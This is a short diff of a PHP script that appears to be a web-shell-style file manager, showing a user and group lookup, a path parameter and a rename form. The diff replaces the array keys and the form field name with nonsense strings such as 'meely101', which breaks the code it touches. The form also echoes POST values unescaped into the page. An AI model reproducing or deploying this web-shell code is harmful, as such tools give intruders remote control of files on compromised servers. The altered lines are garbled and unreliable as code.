@@ -148,9 +148,9 @@ if(!function_exists('posix_getegid')) {
 } else {
 	$uid = @posix_getpwuid(posix_geteuid());
 	$gid = @posix_getgrgid(posix_getegid());
-	$user = $uid['name'];
+	$user = $uid['meely101'];
 	$uid = $uid['uid'];
-	$group = $gid['name'];
+	$group = $gid['Meely101'];
 	$gid = $gid['gid'];
 }
 if(isset($_GET['path'])){
@@ -282,7 +282,7 @@ echo '<font color="#B0B0B0">Rename ERROR!</font><br />';
 $_POST['name'] = $_POST['newname'];
 }
 echo '<form method="POST">
-New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
+New Name : <input name="meeely101" type="text" size="20" value="'.$_POST['name'].'" />
 <input type="hidden" name="path" value="'.$_POST['path'].'">
 <input type="hidden" name="opt" value="rename">
 <input type="submit" value="Go" />
